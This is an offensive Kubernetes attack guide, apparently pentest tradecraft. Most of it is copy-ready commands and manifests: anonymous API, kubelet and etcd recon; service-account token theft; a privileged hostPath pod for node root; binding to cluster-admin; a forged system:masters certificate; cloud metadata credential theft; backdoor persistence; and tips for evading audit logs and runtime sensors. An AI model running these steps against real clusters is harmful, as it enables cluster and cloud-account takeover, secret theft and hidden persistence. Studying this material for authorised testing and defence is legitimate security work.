# Kubernetes Attack Guide

Offensive tradecraft for Kubernetes clusters: external/anonymous recon, the exposed
control-plane and node components (API server, kubelet, etcd, dashboard), service-
account token theft, RBAC privilege escalation, pod-spec abuse for node/host takeover
and cluster-admin, secret looting, lateral movement to the cloud control plane, and
persistence. Grounded in 2025-2026 data (Unit 42 modern K8s threats, peirates /
kube-hunter / kubeletctl tradecraft, RBAC-privesc research showing pod→cluster-admin
in minutes).

> **2025 context:** Privilege escalation is the #1 Kubernetes threat — RBAC
> misconfigurations let an attacker go from a single compromised pod to **cluster-
> admin** in minutes. The recurring root causes are over-broad `create pods`,
> wildcard verbs/resources, `bind`/`escalate`/`impersonate` verbs, and pods that can
> reach the cloud node identity.

```
External  ──►  API server (6443) / kubelet (10250) / etcd (2379) / dashboard
                       │
Compromised pod  ──►  SA token (/var/run/secrets/...)  ──►  K8s API as that SA
                       │                                          │
                       ▼                                          ▼
              host/node escape (privileged, hostPath,    RBAC privesc → cluster-admin
               hostPID, capabilities)                            │
                       │                                          ▼
                       └──────────────►  cloud node identity (IMDS) → cloud account
```

---

## 0. Components & Default Ports

| Component | Port | Notes |
|-----------|------|-------|
| kube-apiserver | 6443 (or 8443/443) | The brain. Anonymous access = jackpot |
| kubelet | 10250 (read/write), 10255 (read-only, legacy) | Per-node; can run commands in pods |
| etcd | 2379/2380 | Key-value store — **all secrets in plaintext** if reachable |
| kube-scheduler / controller | 10257/10259 | Usually localhost-only |
| Dashboard | varies (NodePort) | Often over-permissioned SA |
| NodePort range | 30000-32767 | Exposed services |

---

## 1. External / Anonymous Recon

```bash
# Find exposed clusters
nmap -p 6443,10250,10255,2379,8443,30000-32767 <CIDR> --open
# Anonymous API access? (huge if it returns data)
curl -k https://<API>:6443/api/v1/namespaces/default/pods
curl -k https://<API>:6443/version
curl -k https://<API>:6443/api/v1/namespaces        # anonymous list = misconfig

# Read-only kubelet (legacy, often open)
curl -sk https://<NODE>:10255/pods | jq .
# Read/write kubelet (10250) — run commands in any pod on that node (no API needed!)
curl -sk https://<NODE>:10250/runningpods/ | jq .
# kubeletctl makes 10250 abuse trivial: https://github.com/cyberark/kubeletctl
kubeletctl pods   -s <NODE>
kubeletctl scan   rce -s <NODE>          # find pods you can exec into
kubeletctl exec   "id" -p <pod> -c <container> -n <ns> -s <NODE>

# etcd unauthenticated → dump everything (secrets included)
etcdctl --endpoints=https://<NODE>:2379 get / --prefix --keys-only
ETCDCTL_API=3 etcdctl --endpoints=https://<NODE>:2379 get /registry/secrets --prefix

# Automated scanner
kube-hunter --remote <API>               # https://github.com/aquasecurity/kube-hunter (CVE list + checks)
```

---

## 2. In-Cluster Foothold: Service-Account Token Theft

When you land in a pod (RCE in an app), the pod's SA token is mounted by default:

```bash
# The treasure — JWT for the pod's service account
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Use it against the API
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/pods

# Or configure kubectl with it
kubectl config set-credentials sa --token=$TOKEN
kubectl config set-cluster k8s --server=$APISERVER --certificate-authority=$CACERT
kubectl config set-context c --cluster=k8s --user=sa --namespace=$NS
kubectl config use-context c
```

```bash
# FIRST question after getting any token — what can it do?
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i '*' '*'                      # cluster-admin?
```

---

## 3. RBAC Enumeration

```bash
# Roles / bindings (where the privesc paths live)
kubectl get clusterroles; kubectl get clusterrolebindings -o wide
kubectl get roles -A;       kubectl get rolebindings -A -o wide
kubectl describe clusterrole cluster-admin

# Who has admin? Map subjects → roles
kubectl get clusterrolebindings -o json | jq -r \
  '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'

# Tooling
# rbac-tool (Insight) — visualize/who-can:
rbac-tool who-can create pods
rbac-tool policy-rules -e '^system:'
# kubectl-who-can:
kubectl who-can create pods
# Peirates — interactive K8s pentest swiss-army knife (token theft, privesc, escapes)
# https://github.com/inguardians/peirates
peirates
```

---

## 4. RBAC Privilege Escalation Paths

The "dangerous verbs/resources" that turn a namespace token into cluster-admin:

### 4.1 `create pods` (the most common path)

```bash
# Mount a privileged SA, the node FS, or run privileged → escape to node / API
# Example: spawn a pod that mounts the host root FS and exec a shell on the NODE
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: esc }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: esc
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl exec -it esc -- chroot /host bash        # = root on the node
```

```bash
# Or schedule a pod onto a CONTROL-PLANE node and steal admin kubeconfig from /host/etc/kubernetes/admin.conf
#   (use nodeName / nodeSelector / tolerations to land on a master)
```

### 4.2 Mount a privileged service account

```bash
# If you can create pods and specify serviceAccountName, run a pod AS a more-powerful SA
spec:
  serviceAccountName: <privileged-sa>     # e.g. one bound to cluster-admin
# then read that SA's token from inside and use it.
```

### 4.3 Other escalation verbs

| Verb / resource you hold | Escalation |
|--------------------------|------------|
| `create pods` | mount node FS / priv container → node root → cluster |
| `pods/exec`, `pods/attach` | run commands in existing (priv) pods |
| `get/list secrets` | read all SA tokens → assume any of them |
| `create serviceaccounts/token` (TokenRequest) | mint tokens for other SAs |
| `bind` (rolebindings/clusterrolebindings) | bind yourself to cluster-admin |
| `escalate` (roles/clusterroles) | grant your role more permissions |
| `impersonate` (users/groups/SAs) | `kubectl --as=...` act as admin |
| `create/update` on `daemonsets/deployments/jobs/cronjobs` | run a pod indirectly (= create pods) |
| `patch nodes` / `delete nodes` | node manipulation, scheduling |
| `csr` approve + `create certificatesigningrequests` | mint a client cert for any group (system:masters) |

```bash
# impersonate path
kubectl get secrets -A --as=system:admin --as-group=system:masters

# bind path → make yourself cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=$NS:$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo default)

# CSR path → forge a system:masters client cert
openssl req -new -newkey rsa:2048 -nodes -keyout pwn.key -subj "/CN=pwn/O=system:masters" -out pwn.csr
# submit CSR, approve it (if you can), download the signed cert → cluster-admin client cert
```

---

## 5. Container → Host Escape

(See `container-docker-escape.md` for full depth.) Quick triage from inside a pod:

```bash
# Am I privileged? Capabilities? Host namespaces?
capsh --print
cat /proc/self/status | grep CapEff
ls -la /dev                                  # /dev/sda* visible = privileged-ish
mount | grep -i host
env | grep -i kube

# Privileged pod → mount the host disk and chroot
fdisk -l
mkdir /host && mount /dev/sda1 /host && chroot /host

# hostPath volume to / already mounted → chroot /host
# CAP_SYS_ADMIN + cgroup v1 release_agent escape (see container guide)
```

---

## 6. Secrets & Data

```bash
kubectl get secrets -A
kubectl get secret <s> -n <ns> -o jsonpath='{.data}' | jq 'map_values(@base64d)'   # decode
# ConfigMaps frequently hold creds too
kubectl get configmaps -A -o yaml | grep -iE 'password|secret|token|key'
# etcd direct dump (if reachable) returns secrets in plaintext
```

---

## 7. Pivot to the Cloud Control Plane

The highest-impact K8s pivot: from a node/pod, reach the **cloud instance identity**.

```bash
# AWS EKS — node instance role (broad) if IMDS not restricted; pod IRSA/Pod-Identity tokens otherwise
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/         # node role (AWS)
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token                     # IRSA

# GCP GKE — node SA token via metadata (Workload Identity restricts this)
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure AKS — node managed identity via IMDS
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

A single pod with reachable node IMDS often equals **whole cloud account** compromise.
(See the AWS/GCP/Azure guides for what to do with the resulting credentials.)

---

## 8. Persistence

| Technique | How | T-ID |
|-----------|-----|------|
| cluster-admin ClusterRoleBinding | bind a benign-looking SA to cluster-admin | T1098 |
| Backdoor DaemonSet | runs a pod on every node, survives reschedules | T1543 |
| Static pod on a node | drop a manifest in `/etc/kubernetes/manifests/` | T1543 |
| Mutating admission webhook | inject containers/creds into every new pod | T1554 |
| Long-lived SA token (TokenRequest w/ long TTL or legacy Secret) | mint & stash | T1528 |
| Shadow API client cert (system:masters) | forge via CSR | T1098 |

---

## 9. Defense Evasion & OPSEC

- The **audit log** (if enabled) records API calls with user/SA, verb, resource. Many
  clusters log poorly — but assume EKS/GKE/AKS managed audit is on and shipped to the
  cloud SIEM.
- Runtime sensors (Falco, Tetragon, Defender for Containers) flag `kubectl exec`,
  privileged pod creation, host mounts, and reverse shells. Privileged-pod escapes are
  high-signal.
- Prefer reading secrets and minting tokens over loud `exec` into prod pods. Use
  existing service-account context rather than creating obvious new bindings when RoE
  is stealth-focused.

---

## 10. Tooling Quick Reference

| Tool | One-liner | Use |
|------|-----------|-----|
| **kubectl** | `kubectl auth can-i --list` | Native enum + action |
| **kube-hunter** | `kube-hunter --remote <API>` | Remote/in-cluster vuln scan |
| **peirates** | `peirates` | Token theft, RBAC privesc, escapes (interactive) |
| **kubeletctl** | `kubeletctl exec "id" -p <pod> -s <NODE>` | Abuse open kubelet (10250) |
| **rbac-tool** | `rbac-tool who-can create pods` | RBAC analysis/visualization |
| **kubectl-who-can** | `kubectl who-can get secrets` | Reverse RBAC lookup |
| **kube-bench** | `kube-bench` | CIS benchmark (find misconfig) |
| **kubescape** | `kubescape scan` | Posture / RBAC / control scan |
| **Trivy** | `trivy k8s --report summary cluster` | Image + cluster + misconfig scan |
| **bust-a-kube / DeepCE / amicontained** | n/a | Container context fingerprinting |

---

## 11. MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Exploit Public-Facing Application | T1190 | App RCE → pod foothold |
| Steal Application Access Token | T1528 | SA token theft |
| Valid Accounts | T1078 | Reused SA / kubeconfig |
| Permission Groups Discovery | T1069 | RBAC enumeration |
| Escape to Host | T1611 | Privileged/hostPath pod |
| Container Administration Command | T1609 | kubectl exec / kubelet |
| Deploy Container | T1610 | Malicious pod creation |
| Unsecured Credentials: Cloud Metadata | T1552.005 | Node IMDS pivot |
| Account Manipulation | T1098 | ClusterRoleBinding backdoor |
| Implant Internal Image / Webhook | T1525 / T1554 | Admission webhook persistence |

---

## References

- Unit 42 — Understanding Current Threats to Kubernetes Environments: https://unit42.paloaltonetworks.com/modern-kubernetes-threats/
- Unit 42 — Mitigating RBAC-Based Privilege Escalation: https://unit42.paloaltonetworks.com/kubernetes-privilege-escalation/
- peirates (InGuardians): https://github.com/inguardians/peirates
- kube-hunter (Aqua): https://github.com/aquasecurity/kube-hunter
- kubeletctl (CyberArk): https://github.com/cyberark/kubeletctl
- Kubernetes — RBAC Good Practices: https://kubernetes.io/docs/concepts/security/rbac-good-practices/
- SCHUTZWERK — Kubernetes RBAC: Paths for Privilege Escalation: https://www.schutzwerk.com/en/blog/kubernetes-privilege-escalation-01/
- HackTricks Cloud — Kubernetes Pentesting: https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security
- MITRE ATT&CK Containers Matrix: https://attack.mitre.org/matrices/enterprise/containers/
